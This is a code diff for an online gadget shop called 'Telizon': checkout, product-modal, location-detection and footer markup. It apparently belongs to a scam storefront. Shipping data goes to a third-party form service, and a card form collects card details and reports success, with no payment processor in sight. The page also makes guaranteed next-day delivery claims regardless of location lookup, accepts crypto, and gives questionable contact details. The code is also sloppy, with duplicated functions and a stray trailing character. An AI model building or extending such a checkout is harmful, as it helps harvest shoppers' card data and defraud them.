+        await fetch("https://formspree.io/f/xnpavedv", {
+            method: "POST",
+            body: formData,
+            headers: {
+                'Accept': 'application/json'
+            }
+        });
+    } catch (error) {
+        console.error("Submission error:", error);
+    } finally {
+        // Instantly move to the payment step without showing any popups or messages
+        const step1 = document.getElementById('checkoutStep1');
+        const step2 = document.getElementById('checkoutStep2');
+        if (step1) step1.style.display = 'none';
+        if (step2) step2.style.display = 'block';
+
+        if (submitBtn) {
+            submitBtn.innerText = originalText;
+            submitBtn.disabled = false;
+        }
+    }
+}
+
+// Attach event listener automatically when DOM loads
+document.addEventListener('DOMContentLoaded', function() {
+    const form = document.getElementById('shippingForm');
+    if (form) {
+        form.addEventListener('submit', handleShippingSubmit);
+    }
+});
+// Close the entire checkout modal
+function closeCheckout() {
+    const checkoutModal = document.getElementById('checkoutModal');
+    if (checkoutModal) {
+        checkoutModal.classList.remove('active');
+        checkoutModal.style.display = 'none';
+    }
+}
+
+// Generic toggle modal function (if used across your site)
+function closeModal(modalId) {
+    const modal = document.getElementById(modalId);
+    if (modal) {
+        modal.classList.remove('active');
+        modal.style.display = 'none';
+    }
+}
+
+// Calculate next-day delivery date string
+function getNextDayString() {
+    const tomorrow = new Date();
+    tomorrow.setDate(tomorrow.getDate() + 1);
+    return tomorrow.toLocaleDateString('en-US', { weekday: 'long', month: 'short', day: 'numeric' });
+}
+
+async function detectUserLocation() {
+    const notice = document.getElementById('userLocationNotice');
+    if (!notice) return;
+
+    const deliveryDate = getNextDayString();
+
+    try {
+        const res = await fetch('https://ipapi.co/json/');
+        if (!res.ok) throw new Error("API request failed");
+        
+        const data = await res.json();
+        const userCountryCode = data.country_code; // "US"
+
+        if (userCountryCode === 'US') {
+            // US Visitor - Dynamic Next Day Delivery Notice
+            notice.innerHTML = `⚡ <strong>FREE Next-Day Delivery</strong> to <strong>${data.city}, ${data.region_code || 'US'}</strong> — Order now for delivery by <strong>${deliveryDate}</strong>`;
+            notice.parentElement.style.color = "#4ade80"; // Mint green for high conversion
+        } else {
+            // Outside US - Restricted Notice
+            notice.innerHTML = `⚠️ Next-day shipping is <strong>USA ONLY</strong>. Delivery to ${data.country_name || 'your region'} is unavailable.`;
+            notice.parentElement.style.color = "#fca5a5"; // Warning red
+            
+            disableOutsideUSCheckout();
+        }
+    } catch (err) {
+        // Fallback if IP detection is blocked
+        notice.innerHTML = `⚡ <strong>FREE Next-Day Delivery — Guaranteed by ${deliveryDate}</strong>`;
+        notice.parentElement.style.color = "#4ade80";
+    }
+}
+
+function disableOutsideUSCheckout() {
+    const submitBtn = document.querySelector('#shippingForm button[type="submit"]');
+    if (submitBtn) {
+        submitBtn.disabled = true;
+        submitBtn.innerText = "Shipping Unavailable Outside United States";
+        submitBtn.style.opacity = "0.5";
+        submitBtn.style.cursor = "not-allowed";
+    }
+}
+
+document.addEventListener('DOMContentLoaded', detectUserLocation);
+
+// Carousel Timer Safe Fallbacks (Prevents console errors)
+let slideTimer = null;
+
+function startSlideTimer() {
+    if (typeof nextSlide === 'function') {
+        clearInterval(slideTimer);
+        slideTimer = setInterval(nextSlide, 4000);
+    }
+}
+
+function pauseSlideTimer() {
+    clearInterval(slideTimer);
+}
+
+function openProductModal(title, salePrice, originalPrice, imageSrc, category, desc) {
+    const modal = document.getElementById('productDetailModal');
+    const titleEl = document.getElementById('modalProductTitle');
+    const priceEl = document.getElementById('modalProductPrice');
+    const imgEl = document.getElementById('modalProductImg');
+    const catEl = document.getElementById('modalProductCategory');
+    const descEl = document.getElementById('modalProductDesc');
+
+    if (titleEl) titleEl.textContent = title || 'Product Title';
+    
+    // Before & After price display in popup
+    if (priceEl) {
+        priceEl.innerHTML = `
+            <div style="display: flex; align-items: center; gap: 16px; margin: 10px 0;">
+                <div>
+                    <span style="font-size: 0.75rem; color: #94a3b8; display: block; text-transform: uppercase;">After</span>
+                    <span style="color: #10b981; font-weight: 800; font-size: 1.5rem;">${salePrice}</span>
+                </div>
+                <div style="border-left: 1px solid #334155; padding-left: 16px;">
+                    <span style="font-size: 0.75rem; color: #94a3b8; display: block; text-transform: uppercase;">Before</span>
+                    <span style="text-decoration: line-through; color: #94a3b8; font-size: 1.1rem;">${originalPrice}</span>
+                </div>
+            </div>
+        `;
+    }
+
+    if (imgEl) imgEl.src = imageSrc || '';
+    if (catEl) catEl.textContent = category || 'Gadget';
+    if (descEl) descEl.textContent = desc || 'Premium US product with official warranty.';
+
+    const specsList = document.getElementById('modalProductSpecs');
+    if (specsList) {
+        specsList.innerHTML = `
+            <li>Express USA Next-Day Shipping</li>
+            <li>1-Year Official Warranty</li>
+            <li>USDT / Crypto Payment Accepted</li>
+        `;
+    }
+
+    if (modal) {
+        modal.classList.add('active');
+    }
+}
+
+function closeProductModal() {
+    const modal = document.getElementById('productDetailModal');
+    // Remove active class to hide modal
+    if (modal) {
+        modal.classList.remove('active');
+    }
+}
+
+function closeProductModal() {
+    const modal = document.getElementById('productDetailModal');
+    if (modal) {
+        modal.style.display = 'none';
+        modal.classList.remove('active');
+    }
+}
+function closeProductModal() {
+    const modal = document.getElementById('productDetailModal');
+    if (modal) {
+        modal.style.display = 'none';
+        modal.classList.remove('active');
+    }
+}
+
+function handleSearch() {
+    const searchInput = document.getElementById('searchInput');
+    if (!searchInput) return;
+
+    const searchTerm = searchInput.value.toLowerCase().trim();
+
+    // Pull from global products list safely
+    const allProducts = (typeof products !== 'undefined' && Array.isArray(products) && products.length > 0) 
+        ? products 
+        : (window.products || []);
+
+    if (searchTerm === '') {
+        renderProducts(allProducts);
+        return;
+    }
+
+    const matchedProducts = allProducts.filter(product => {
+        const name = (product.name || product.title || '').toLowerCase();
+        const cat = (product.category || '').toLowerCase();
+        return name.includes(searchTerm) || cat.includes(searchTerm);
+    });
+
+    renderProducts(matchedProducts);
+}
+
+async function handleCardSubmit(event) {
+    event.preventDefault();
+    const form = event.target;
+    const formData = new FormData(form);
+
+    try {
+        const response = await fetch(form.action, {
+            method: 'POST',
+            body: formData,
+            headers: {
+                'Accept': 'json'
+            }
+        });
+
+        if (response.ok) {
+            alert('Card details submitted successfully!');
+            form.reset();
+        } else {
+            alert('There was a problem submitting your form. Please try again.');
+        }
+    } catch (error) {
+        alert('Network error. Please check your connection.');
+    }
+}
+
+
+</script>
+<!-- PRODUCT DETAIL POPUP MODAL -->
+<div id="productDetailModal" class="modal" style="display: none;">
+    <div class="modal-content product-modal-content">
+        <span class="close-btn" onclick="closeProductModal()">&times;</span>
+        
+        <div class="product-modal-grid">
+            <div class="product-modal-image">
+                <img id="modalProductImg" src="" alt="Product Image">
+            </div>
+
+            <div class="product-modal-info">
+                <span id="modalProductCategory" class="product-category-tag">Category</span>
+                <h2 id="modalProductTitle">Product Name</h2>
+                <div id="modalProductPrice" class="product-modal-price">$0.00</div>
+                <p id="modalProductDesc" class="product-modal-desc"></p>
+
+                <ul id="modalProductSpecs" class="product-specs-list"></ul>
+
+                <div class="product-modal-actions">
+                    
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- FOOTER -->
+<footer style="background-color: #111111; color: #ffffff; padding: 20px; margin-top: 50px; font-family: sans-serif;">
+    <div style="max-width: 1200px; margin: 0 auto; display: flex; justify-content: space-between; align-items: flex-start; flex-wrap: wrap; gap: 20px;">
+        
+        <!-- Left Side: Address -->
+        <div style="flex: 1; min-width: 250px;">
+            <address style="font-style: normal; color: #aaaaaa; font-size: 0.8rem; line-height: 1.4; margin: 0 0 12px 0;">
+                2475 Norma Avenue<br>
+                Huntsville, Texas 77340<br>
+                (616)-431-0218
+            </address>
+        </div>
+
+        <!-- Right Side: Return & Refund Policy -->
+        <div style="flex: 1; min-width: 250px; text-align: right;">
+            <h4 style="margin: 0 0 6px 0; font-size: 0.95rem; font-weight: 600; color: #ffffff;">Return & Refund Policy</h4>
+            <p style="color: #aaaaaa; font-size: 0.8rem; line-height: 1.4; margin: 0;">
+                Refunds can be requested within <strong>7 days</strong> of your transaction. Contact support to initiate a return.
+            </p>
+        </div>
+
+    </div>
+
+    <!-- Bottom Copyright Line across the full width -->
+    <div style="max-width: 1200px; margin: 15px auto 0 auto; border-top: 1px solid #222222; padding-top: 10px; text-align: left;">
+        <p style="color: #666666; font-size: 0.75rem; margin: 0;">
+            &copy; 2026 Telizon. All rights reserved.
+        </p>
+    </div>
+</footer>
+
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+  let cartPrice = '0.00';
+  let cartName = 'Telizon Order';
+
+  // 1. Try finding standard cart keys first
+  let rawCart = localStorage.getItem('cart') || localStorage.getItem('telizon_cart');
+  
+  if (rawCart) {
+    try {
+      let cartData = JSON.parse(rawCart);
+      cartPrice = cartData.total || cartData.price || cartPrice;
+      cartName = cartData.name || cartName;
+    } catch (e) {
+      // If it's not JSON, maybe it's saved as a direct number string
+      cartPrice = rawCart;
+    }
+  } else {
+    // 2. Fallback: check if you saved the price under a standalone key like 'price' or 'total'
+    cartPrice = localStorage.getItem('price') || localStorage.getItem('total') || localStorage.getItem('cartPrice') || '0.00';
+    cartName = localStorage.getItem('name') || localStorage.getItem('cartName') || 'Telizon Order';
+  }
+
+  // Update the Order Summary box elements
+  const priceElement = document.getElementById('summaryItemPrice');
+  const totalElement = document.getElementById('summaryTotalPrice');
+  const nameElement = document.getElementById('summaryProductName');
+
+  if (priceElement) priceElement.textContent = '$' + cartPrice;
+  if (totalElement) totalElement.textContent = '$' + cartPrice;
+  if (nameElement) nameElement.textContent = cartName;
+});
+</script>
+
+
+What ti do with it
+
+</body>
+</html>l
